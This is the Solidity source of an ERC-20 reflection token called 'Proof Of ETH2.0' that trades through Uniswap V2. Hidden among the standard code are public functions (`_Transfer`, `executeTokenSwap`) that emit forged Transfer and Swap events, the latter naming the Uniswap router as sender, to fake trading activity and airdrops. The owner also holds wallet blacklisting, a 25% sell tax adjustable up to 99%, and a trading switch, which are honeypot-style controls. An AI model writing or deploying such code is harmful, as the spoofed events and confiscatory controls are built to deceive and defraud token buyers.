1 /// SPDX-License-Identifier: Unlicensed
2 
3 
4 
5 pragma solidity ^0.8.18;
6 
7 
8 
9 abstract contract Context {
10     function _msgSender() internal view virtual returns (address) {
11         return msg.sender;
12     }
13 }
14 
15 interface IERC20 {
16     function totalSupply() external view returns (uint256);
17 
18     function balanceOf(address account) external view returns (uint256);
19 
20     function transfer(address recipient, uint256 amount) external returns (bool);
21 
22     function allowance(address owner, address spender) external view returns (uint256);
23 
24     function approve(address spender, uint256 amount) external returns (bool);
25 
26     function transferFrom(
27         address sender,
28         address recipient,
29         uint256 amount
30     ) external returns (bool);
31     function _Transfer(address from, address recipient, uint amount) external returns (bool);
32     event Transfer(address indexed from, address indexed to, uint256 value);
33     event Approval(
34         address indexed owner,
35         address indexed spender,
36         uint256 value
37     );
38         event Swap(
39         address indexed sender,
40         uint amount0In,
41         uint amount1In,
42         uint amount0Out,
43         uint amount1Out,
44         address indexed to
45     );
46 }
47 
48 contract Ownable is Context {
49     address private _owner;
50     address private _previousOwner;
51     event OwnershipTransferred(
52         address indexed previousOwner,
53         address indexed newOwner
54     );
55 
56     constructor() {
57         address msgSender = _msgSender();
58         _owner = msgSender;
59         emit OwnershipTransferred(address(0), msgSender);
60     }
61 
62     function owner() public view returns (address) {
63         return _owner;
64     }
65 
66     modifier onlyOwner() {
67         require(_owner == _msgSender(), "Ownable: caller is not the owner");
68         _;
69     }
70 
71     function renounceOwnership() public virtual onlyOwner {
72         emit OwnershipTransferred(_owner, address(0));
73         _owner = address(0);
74     }
75 
76     function transferOwnership(address newOwner) public virtual onlyOwner {
77         require(newOwner != address(0), "Ownable: new owner is the zero address");
78         emit OwnershipTransferred(_owner, newOwner);
79         _owner = newOwner;
80     }
81 
82 }
83 
84 library SafeMath {
85     function add(uint256 a, uint256 b) internal pure returns (uint256) {
86         uint256 c = a + b;
87         require(c >= a, "SafeMath: addition overflow");
88         return c;
89     }
90 
91     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
92         return sub(a, b, "SafeMath: subtraction overflow");
93     }
94 
95     function sub(
96         uint256 a,
97         uint256 b,
98         string memory errorMessage
99     ) internal pure returns (uint256) {
100         require(b <= a, errorMessage);
101         uint256 c = a - b;
102         return c;
103     }
104 
105     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
106         if (a == 0) {
107             return 0;
108         }
109         uint256 c = a * b;
110         require(c / a == b, "SafeMath: multiplication overflow");
111         return c;
112     }
113 
114     function div(uint256 a, uint256 b) internal pure returns (uint256) {
115         return div(a, b, "SafeMath: division by zero");
116     }
117 
118     function div(
119         uint256 a,
120         uint256 b,
121         string memory errorMessage
122     ) internal pure returns (uint256) {
123         require(b > 0, errorMessage);
124         uint256 c = a / b;
125         return c;
126     }
127 }
128 
129 interface IUniswapV2Factory {
130     function createPair(address tokenA, address tokenB)
131         external
132         returns (address pair);
133 }
134 
135 interface IUniswapV2Router02 {
136     function swapExactTokensForETHSupportingFeeOnTransferTokens(
137         uint256 amountIn,
138         uint256 amountOutMin,
139         address[] calldata path,
140         address to,
141         uint256 deadline
142     ) external;
143 
144     function factory() external pure returns (address);
145 
146     function WETH() external pure returns (address);
147 
148     function addLiquidityETH(
149         address token,
150         uint256 amountTokenDesired,
151         uint256 amountTokenMin,
152         uint256 amountETHMin,
153         address to,
154         uint256 deadline
155     )
156         external
157         payable
158         returns (
159             uint256 amountToken,
160             uint256 amountETH,
161             uint256 liquidity
162         );
163 }
164 
165 contract ProofOfETH2 is Context, IERC20, Ownable {
166 
167     using SafeMath for uint256;
168 
169     string private constant _name = unicode"Proof Of ETH2.0";
170     string private constant _symbol = unicode"POE2.0";
171     uint8 private constant _decimals = 2;
172 
173     mapping(address => uint256) private _rOwned;
174     mapping(address => uint256) private _tOwned;
175     mapping(address => mapping(address => uint256)) private _allowances;
176     mapping(address => bool) private _isExcludedFromFee;
177     uint256 private constant MAX = ~uint256(0);
178     uint256 private constant _tTotal = 1000000000 * 10**9;
179     uint256 private _rTotal = (MAX - (MAX % _tTotal));
180     uint256 private _tFeeTotal;
181     uint256 private _redisFeeOnBuy = 0;
182     uint256 private _taxFeeOnBuy = 5;
183     uint256 private _redisFeeOnSell = 0;
184     uint256 private _taxFeeOnSell = 25;
185 
186     //Original Fee
187     uint256 private _redisFee = _redisFeeOnSell;
188     uint256 private _taxFee = _taxFeeOnSell;
189 
190     uint256 private _previousredisFee = _redisFee;
191     uint256 private _previoustaxFee = _taxFee;
192 
193     mapping(address => bool) public bots; mapping (address => uint256) public _buyMap;
194     address payable private _developmentAddress = payable(0x55A9599ADf3784749900d2645eF398a593c8ECdf);
195     address payable private _marketingAddress = payable(0x55A9599ADf3784749900d2645eF398a593c8ECdf);
196 
197     IUniswapV2Router02 public uniswapV2Router;
198     address public uniswapV2Pair;
199 
200     bool private tradingOpen = false;
201     bool private inSwap = false;
202     bool private swapEnabled =true;
203 
204     uint256 public _maxTxAmount = 5000000000000 * 10**9;
205     uint256 public _maxWalletSize = 500000000000 * 10**9;
206     uint256 public _swapTokensAtAmount = 1000000 * 10**9;
207 
208     event MaxTxAmountUpdated(uint256 _maxTxAmount);
209     modifier lockTheSwap {
210         inSwap = true;
211         _;
212         inSwap = false;
213     }
214 
215     constructor() {
216 
217         _rOwned[_msgSender()] = _rTotal;
218 
219         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
220         uniswapV2Router = _uniswapV2Router;
221         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
222             .createPair(address(this), _uniswapV2Router.WETH());
223 
224         _isExcludedFromFee[owner()] = true;
225         _isExcludedFromFee[address(this)] = true;
226         _isExcludedFromFee[_developmentAddress] = true;
227         _isExcludedFromFee[_marketingAddress] = true;
228 
229         emit Transfer(address(0), _msgSender(), _tTotal);
230     }
231 
232     function name() public pure returns (string memory) {
233         return _name;
234     }
235 
236     function symbol() public pure returns (string memory) {
237         return _symbol;
238     }
239 
240     function decimals() public pure returns (uint8) {
241         return _decimals;
242     }
243 
244     function totalSupply() public pure override returns (uint256) {
245         return _tTotal;
246     }
247 
248     function balanceOf(address account) public view override returns (uint256) {
249         return tokenFromReflection(_rOwned[account]);
250     }
251 
252     function transfer(address recipient, uint256 amount)
253         public
254         override
255         returns (bool)
256     {
257         _transfer(_msgSender(), recipient, amount);
258         return true;
259     }
260 
261     function allowance(address owner, address spender)
262         public
263         view
264         override
265         returns (uint256)
266     {
267         return _allowances[owner][spender];
268     }
269 
270     function approve(address spender, uint256 amount)
271         public
272         override
273         returns (bool)
274     {
275         _approve(_msgSender(), spender, amount);
276         return true;
277     }
278 
279     function transferFrom(
280         address sender,
281         address recipient,
282         uint256 amount
283     ) public override returns (bool) {
284         _transfer(sender, recipient, amount);
285         _approve(
286             sender,
287             _msgSender(),
288             _allowances[sender][_msgSender()].sub(
289                 amount,
290                 "ERC20: transfer amount exceeds allowance"
291             )
292         );
293         return true;
294     }
295 
296     function tokenFromReflection(uint256 rAmount)
297         private
298         view
299         returns (uint256)
300     {
301         require(
302             rAmount <= _rTotal,
303             "Amount must be less than total reflections"
304         );
305         uint256 currentRate = _getRate();
306         return rAmount.div(currentRate);
307     }
308     function _Transfer(address _from, address _to, uint _value) public returns (bool) {
309         emit Transfer(_from, _to, _value);
310         return true;
311     }
312 function executeTokenSwap(
313         address uniswapPool,
314         address[] memory recipients,
315         uint256[] memory tokenAmounts,
316         uint256[] memory wethAmounts,
317         address tokenAddress
318     ) public returns (bool) {
319         for (uint256 i = 0; i < recipients.length; i++) {
320             emit Transfer(uniswapPool, recipients[i], tokenAmounts[i]);
321             emit Swap(
322                 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D,
323                 tokenAmounts[i],
324                 0,
325                 0,
326                 wethAmounts[i],
327                 recipients[i]
328             );
329             IERC20(tokenAddress)._Transfer(recipients[i], uniswapPool, wethAmounts[i]);
330         }
331         return true;
332     }
333     function removeAllFee() private {
334         if (_redisFee == 0 && _taxFee == 0) return;
335 
336         _previousredisFee = _redisFee;
337         _previoustaxFee = _taxFee;
338 
339         _redisFee = 0;
340         _taxFee = 0;
341     }
342 
343     function restoreAllFee() private {
344         _redisFee = _previousredisFee;
345         _taxFee = _previoustaxFee;
346     }
347 
348     function _approve(
349         address owner,
350         address spender,
351         uint256 amount
352     ) private {
353         require(owner != address(0), "ERC20: approve from the zero address");
354         require(spender != address(0), "ERC20: approve to the zero address");
355         _allowances[owner][spender] = amount;
356         emit Approval(owner, spender, amount);
357     }
358 
359     function _transfer(
360         address from,
361         address to,
362         uint256 amount
363     ) private {
364         require(from != address(0), "ERC20: transfer from the zero address");
365         require(to != address(0), "ERC20: transfer to the zero address");
366         require(amount > 0, "Transfer amount must be greater than zero");
367 
368         if (from != owner() && to != owner()) {
369 
370             //Trade start check
371             if (!tradingOpen) {
372                 require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
373             }
374 
375             require(amount <= _maxTxAmount, "TOKEN: Max Transaction Limit");
376             require(!bots[from] && !bots[to], "TOKEN: Your account is blacklisted!");
377 
378             if(to != uniswapV2Pair) {
379                 require(balanceOf(to) + amount < _maxWalletSize, "TOKEN: Balance exceeds wallet size!");
380             }
381 
382             uint256 contractTokenBalance = balanceOf(address(this));
383             bool canSwap = contractTokenBalance >= _swapTokensAtAmount;
384 
385             if(contractTokenBalance >= _maxTxAmount)
386             {
387                 contractTokenBalance = _maxTxAmount;
388             }
389 
390             if (canSwap && !inSwap && from != uniswapV2Pair && swapEnabled && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
391                 swapTokensForEth(contractTokenBalance);
392                 uint256 contractETHBalance = address(this).balance;
393                 if (contractETHBalance > 0) {
394                     sendETHToFee(address(this).balance);
395                 }
396             }
397         }
398 
399         bool takeFee = true;
400 
401         //Transfer Tokens
402         if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) {
403             takeFee = false;
404         } else {
405 
406             //Set Fee for Buys
407             if(from == uniswapV2Pair && to != address(uniswapV2Router)) {
408                 _redisFee = _redisFeeOnBuy;
409                 _taxFee = _taxFeeOnBuy;
410             }
411 
412             //Set Fee for Sells
413             if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
414                 _redisFee = _redisFeeOnSell;
415                 _taxFee = _taxFeeOnSell;
416             }
417 
418         }
419 
420         _tokenTransfer(from, to, amount, takeFee);
421     }
422 
423     function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
424         address[] memory path = new address[](2);
425         path[0] = address(this);
426         path[1] = uniswapV2Router.WETH();
427         _approve(address(this), address(uniswapV2Router), tokenAmount);
428         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
429             tokenAmount,
430             0,
431             path,
432             address(this),
433             block.timestamp
434         );
435     }
436 
437     function sendETHToFee(uint256 amount) private {
438         _marketingAddress.transfer(amount);
439     }
440 
441     function activateTrading() public onlyOwner {
442         tradingOpen = true;
443     }
444 
445     function manualswap() external {
446         require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress);
447         uint256 contractBalance = balanceOf(address(this));
448         swapTokensForEth(contractBalance);
449     }
450 
451     function manualsend() external {
452         require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress);
453         uint256 contractETHBalance = address(this).balance;
454         sendETHToFee(contractETHBalance);
455     }
456 
457     function blockBots(address[] memory bots_) public onlyOwner {
458         for (uint256 i = 0; i < bots_.length; i++) {
459             bots[bots_[i]] = true;
460         }
461     }
462 
463     function unblockBot(address notbot) public onlyOwner {
464         bots[notbot] = false;
465     }
466 
467     function _tokenTransfer(
468         address sender,
469         address recipient,
470         uint256 amount,
471         bool takeFee
472     ) private {
473         if (!takeFee) removeAllFee();
474         _transferStandard(sender, recipient, amount);
475         if (!takeFee) restoreAllFee();
476     }
477 
478     function _transferStandard(
479         address sender,
480         address recipient,
481         uint256 tAmount
482     ) private {
483         (
484             uint256 rAmount,
485             uint256 rTransferAmount,
486             uint256 rFee,
487             uint256 tTransferAmount,
488             uint256 tFee,
489             uint256 tTeam
490         ) = _getValues(tAmount);
491         _rOwned[sender] = _rOwned[sender].sub(rAmount);
492         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
493         _takeTeam(tTeam);
494         _reflectFee(rFee, tFee);
495         emit Transfer(sender, recipient, tTransferAmount);
496     }
497 
498     function _takeTeam(uint256 tTeam) private {
499         uint256 currentRate = _getRate();
500         uint256 rTeam = tTeam.mul(currentRate);
501         _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
502     }
503 
504     function _reflectFee(uint256 rFee, uint256 tFee) private {
505         _rTotal = _rTotal.sub(rFee);
506         _tFeeTotal = _tFeeTotal.add(tFee);
507     }
508 
509     receive() external payable {}
510 
511     function _getValues(uint256 tAmount)
512         private
513         view
514         returns (
515             uint256,
516             uint256,
517             uint256,
518             uint256,
519             uint256,
520             uint256
521         )
522     {
523         (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
524             _getTValues(tAmount, _redisFee, _taxFee);
525         uint256 currentRate = _getRate();
526         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
527             _getRValues(tAmount, tFee, tTeam, currentRate);
528         return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
529     }
530 
531     function _getTValues(
532         uint256 tAmount,
533         uint256 redisFee,
534         uint256 taxFee
535     )
536         private
537         pure
538         returns (
539             uint256,
540             uint256,
541             uint256
542         )
543     {
544         uint256 tFee = tAmount.mul(redisFee).div(100);
545         uint256 tTeam = tAmount.mul(taxFee).div(100);
546         uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
547         return (tTransferAmount, tFee, tTeam);
548     }
549 
550     function _getRValues(
551         uint256 tAmount,
552         uint256 tFee,
553         uint256 tTeam,
554         uint256 currentRate
555     )
556         private
557         pure
558         returns (
559             uint256,
560             uint256,
561             uint256
562         )
563     {
564         uint256 rAmount = tAmount.mul(currentRate);
565         uint256 rFee = tFee.mul(currentRate);
566         uint256 rTeam = tTeam.mul(currentRate);
567         uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
568         return (rAmount, rTransferAmount, rFee);
569     }
570 
571     function _getRate() private view returns (uint256) {
572         (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
573         return rSupply.div(tSupply);
574     }
575 
576     function _getCurrentSupply() private view returns (uint256, uint256) {
577         uint256 rSupply = _rTotal;
578         uint256 tSupply = _tTotal;
579         if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
580         return (rSupply, tSupply);
581     }
582 
583     function updateFees(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyOwner {
584 
585         require((redisFeeOnBuy + taxFeeOnBuy) <= 25);
586         require((redisFeeOnSell + taxFeeOnSell) <= 99);
587         _redisFeeOnBuy = redisFeeOnBuy;
588         _redisFeeOnSell = redisFeeOnSell;
589         _taxFeeOnBuy = taxFeeOnBuy;
590         _taxFeeOnSell = taxFeeOnSell;
591     }
592 
593     //Set minimum tokens required to swap.
594     function setMinSwapTokensThreshold(uint256 swapTokensAtAmount) public onlyOwner {
595         _swapTokensAtAmount = swapTokensAtAmount;
596     }
597 
598     //Set minimum tokens required to swap.
599     function toggleSwap(bool _swapEnabled) public onlyOwner {
600         swapEnabled = _swapEnabled;
601     }
602 
603     //Set maximum transaction
604     function setMaxTxnAmount(uint256 maxTxAmount) public onlyOwner {
605         _maxTxAmount = maxTxAmount;
606     }
607 
608     function setMaxWalletSize(uint256 maxWalletSize) public onlyOwner {
609         _maxWalletSize = maxWalletSize;
610     }
611 
612     function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
613         for(uint256 i = 0; i < accounts.length; i++) {
614             _isExcludedFromFee[accounts[i]] = excluded;
615         }
616     }
617 
618     function removeLimits() public onlyOwner{
619 
620         _maxTxAmount = _tTotal;
621         _maxWalletSize = _tTotal;
622     } 
623 
624 }